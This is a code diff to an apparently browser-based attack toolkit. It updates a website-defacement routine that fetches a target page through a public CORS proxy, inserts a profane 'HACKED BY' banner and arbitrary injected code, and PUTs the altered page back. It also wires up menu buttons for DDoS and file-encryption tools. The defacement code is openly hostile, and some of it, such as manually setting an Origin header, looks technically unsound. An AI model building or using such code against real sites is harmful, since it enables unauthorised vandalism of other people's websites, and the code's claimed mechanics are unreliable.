@@ -34,12 +34,15 @@ window.onload = function () {
 
 // Function to fetch content with CORS bypass and error handling
 async function fetchWithCORS(url) {
-    const corsProxy = 'https://thingproxy.freeboard.io/fetch/'; // Using thingproxy.freeboard.io
+    const corsProxy = 'https://corsproxy.io/?'; // Using corsproxy.io
     const proxiedUrl = corsProxy + encodeURIComponent(url);
 
     try {
         const response = await fetch(proxiedUrl, {
             mode: 'cors', // Explicitly set CORS mode
+            headers: {
+                'Origin': window.location.origin // Include origin header
+            }
         });
         if (!response.ok) {
             throw new Error(`HTTP error! Status: ${response.status}`);
@@ -91,18 +94,19 @@ async function performDefacement(targetURL, defacementCode) {
         const originalContent = await fetchWithCORS(targetURL);
         const modifiedContent = originalContent.replace('</body>', `<div style="color: purple; background-color: darkred; font-size: 2em; text-align: center;">HACKED BY Noodles Inc. - YOU JUST GOT FUCKED!</div>${defacementCode}</body>`);
 
-        // Use a proxy to bypass CORS for PUT requests
-        const corsProxy = 'https://thingproxy.freeboard.io/fetch/';
-        const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+         // Use a proxy to bypass CORS for PUT requests
+         const corsProxy = 'https://corsproxy.io/?';
+         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
-        const response = await fetch(proxiedUrl, {
-            method: 'PUT',
-            mode: 'cors',  // Explicitly set CORS mode
-            headers: {
-                'Content-Type': 'text/html',
-            },
-            body: modifiedContent,
-        });
+         const response = await fetch(proxiedUrl, {
+             method: 'PUT',
+             mode: 'cors',  // Explicitly set CORS mode
+             headers: {
+                 'Content-Type': 'text/html',
+                 'Origin': window.location.origin  // Include origin header
+             },
+             body: modifiedContent,
+         });
 
         if (!response.ok) {
             throw new Error(`HTTP error! Status: ${response.status}`);
@@ -305,7 +309,7 @@ function addNavbar() {
  `;
     defaceButtonNav.addEventListener('click', () => {
         // Redirect or show defacement tool section
-        alert('Redirecting to Defacement Tool');
+        redirectToDeface();
     });
     navbar.appendChild(defaceButtonNav);
 
@@ -320,7 +324,7 @@ function addNavbar() {
  `;
     ddosButtonNav.addEventListener('click', () => {
         // Redirect or show DDoS tool section
-        alert('Redirecting to DDoS Tool');
+        redirectToDDOS();
     });
     navbar.appendChild(ddosButtonNav);
 
@@ -335,7 +339,7 @@ function addNavbar() {
  `;
     encryptButtonNav.addEventListener('click', () => {
         // Redirect or show File Encryption tool section
-        alert('Redirecting to File Encryption Tool');
+        redirectToEncryptionTool();
     });
     navbar.appendChild(encryptButtonNav);
 
@@ -384,7 +388,7 @@ function addSidebar() {
  `;
     defaceButtonSidebar.addEventListener('click', () => {
         // Redirect or show defacement tool section
-        alert('Redirecting to Defacement Tool');
+        redirectToDeface();
     });
     sidebar.appendChild(defaceButtonSidebar);
 
@@ -400,7 +404,7 @@ function addSidebar() {
  `;
     ddosButtonSidebar.addEventListener('click', () => {
         // Redirect or show DDoS tool section
-        alert('Redirecting to DDoS Tool');
+        redirectToDDOS();
     });
     sidebar.appendChild(ddosButtonSidebar);
 
@@ -415,7 +419,7 @@ function addSidebar() {
  `;
     encryptButtonSidebar.addEventListener('click', () => {
         // Redirect or show File Encryption tool section
-        alert('Redirecting to File Encryption Tool');
+        redirectToEncryptionTool();
     });
     sidebar.appendChild(encryptButtonSidebar);
 
@@ -642,18 +646,19 @@ async function restoreWebsite(targetURL) {
         const backupResponse = await fetch(backupURL, { mode: 'cors' });
         const backupContent = await backupResponse.text();
 
-        // Use a proxy to bypass CORS for PUT requests
-        const corsProxy = 'https://thingproxy.freeboard.io/fetch/';
-        const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
+         // Use a proxy to bypass CORS for PUT requests
+         const corsProxy = 'https://corsproxy.io/?';
+         const proxiedUrl = corsProxy + encodeURIComponent(targetURL);
 
-        const response = await fetch(proxiedUrl, {
-            method: 'PUT',
-            mode: 'cors',  // Explicitly set CORS mode
-            headers: {
-                'Content-Type': 'text/html',
-            },
-            body: backupContent,
-        });
+         const response = await fetch(proxiedUrl, {
+             method: 'PUT',
+             mode: 'cors',  // Explicitly set CORS mode
+             headers: {
+                 'Content-Type': 'text/html',
+                 'Origin': window.location.origin  // Include origin header
+             },
+             body: backupContent,
+         });
 
         if (!response.ok) {
             throw new Error(`HTTP error! Status: ${response.status}`);
@@ -788,3 +793,6 @@ function isValidURL(str) {
         return false;
     }
 }
+
+// Added Navbar Links
+addNavbarLinks();
